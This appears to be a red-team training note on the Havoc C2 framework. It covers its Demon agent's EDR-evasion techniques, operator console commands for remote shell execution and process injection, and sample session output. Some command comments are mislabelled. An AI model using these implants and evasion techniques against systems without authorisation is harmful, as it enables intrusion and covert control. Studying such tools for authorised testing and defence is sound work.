---
tags: [c2, red-team, infrastructure, vapt]
difficulty: intermediate
module: "94 - Command and Control Foundations and Architectures"
topic: "94.16 Havoc C2 Framework"
---

# 94.16 — Havoc C2 Framework

## What is it?

Havoc is a modern, open-source, post-exploitation command and control (C2) framework designed as an alternative to Cobalt Strike and Sliver. It features a highly customizable agent called Demon, which is written in C/ASM and supports advanced evasion techniques such as sleep masking, stack spoofing, API hashing, and indirect syscalls. Havoc provides a multi-user collaborative client-server architecture with a Qt5-based graphical user interface (GUI).

---

## Evasion Capabilities of the Demon Agent

The Demon agent is designed for modern Windows environments and incorporates techniques to bypass Endpoint Detection and Response (EDR) agents:
- **Indirect Syscalls**: Bypasses EDR user-mode hooks by executing system calls indirectly using custom asm stubs.
- **Sleep Masking**: Encrypts the agent's memory payload in-between sleep cycles to prevent signature-based memory scanning.
- **Stack Spoofing**: Spoofs the call stack during sleep to hide the origin of the execution thread.
- **API Hashing**: Resolves Windows API functions at runtime using custom hashes (e.g., DJB2 or MurmurHash) instead of import table names.

---

## Use Cases

### 1. EDR Evasion Testing
In highly monitored environments with active EDRs (like CrowdStrike Falcon, SentinelOne, or Microsoft Defender for Endpoint), standard C2 agents (like basic Meterpreter) are immediately terminated. Demon payloads can be compiled with custom configurations (e.g., proxy configuration, indirect syscall modes) to evaluate the detection threshold of these security controls.

### 2. Multi-Operator Collaborative Red Teaming
Havoc allows multiple operators to connect to a single teamserver simultaneously. Operators can interact with active sessions, share commands, manage pivots, and orchestrate complex lateral movement campaigns from a unified visual interface.

### 3. Custom Payload Development
Developing third-party extension modules (using python scripts or C/ASM extensions) to run commands or perform specific post-exploitation activities without triggering static behavior-based alerts.

---

## Commands

Here are some of the key commands executed within the Havoc C2 console for Demon agent management:

```bash
# Start the Havoc Teamserver with a specific profile
./havoc server --profile profiles/havoc.yaotl --verbose

# Run the Havoc GUI client to connect to the teamserver
./havoc client

# Demon agent interactive commands inside the console:
# Check current system info
checkin

# Set agent sleep time (seconds) and jitter percentage
sleep 10 20

# Execute a shell command using cmd.exe
shell whoami /all

# Inject Demon shellcode into a specific process ID
inject dll x64 1234 C:\\Payloads\\demon.dll

# Perform process injection via process hollowing
spawn x64 C:\\Windows\\System32\\notepad.exe

# Retrieve active process list
process list
```

---

## Sample Output

### Havoc Teamserver Startup Log
```text
[+] Havoc Framework Version: 0.7.0
[+] Loading Profile: profiles/havoc.yaotl
[+] Compiled Demon payload generator successfully
[+] Starting Teamserver Listener on 0.0.0.0:40056
[+] SSL Certificate configured (SHA256: 4f8b9a102c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f)
[*] Waiting for GUI connections...
[!] Operator 'alice' authenticated successfully from 192.168.10.15
```

### Demon Agent Shell Output
```text
Havoc CLI (Demon #12345678) > shell whoami /all

[*] Command queued: 'shell whoami /all'
[+] Received output from Demon agent:

USER INFORMATION
----------------

User Name             SID
===================== =============================================
desktop-vapt\\operator S-1-5-21-4293847294-8294810239-102938472-1001

GROUP INFORMATION
-----------------

Group Name                             Type             Attributes
====================================== ================ ==================================================
Everyone                               Well-known group Mandatory, Enabled by default, Enabled
BUILTIN\\Administrators                 Alias            Mandatory, Enabled by default, Enabled, Owner
BUILTIN\\Users                          Alias            Mandatory, Enabled by default, Enabled
NT AUTHORITY\\INTERACTIVE               Well-known group Mandatory, Enabled by default, Enabled
NT AUTHORITY\\Authenticated Users       Well-known group Mandatory, Enabled by default, Enabled
NT AUTHORITY\\This Organization         Well-known group Mandatory, Enabled by default, Enabled
NT AUTHORITY\\Local account and member  Well-known group Mandatory, Enabled by default, Enabled
  of Administrators group
```

---

## Related Notes
- [[01 - Introduction to Command and Control C2 Frameworks]] — general C2 concepts
- [[02 - C2 Architecture Listeners Implants and Team Servers]] — C2 architecture reference
- [[05 - Staged vs Stageless Payloads]] — payload delivery options
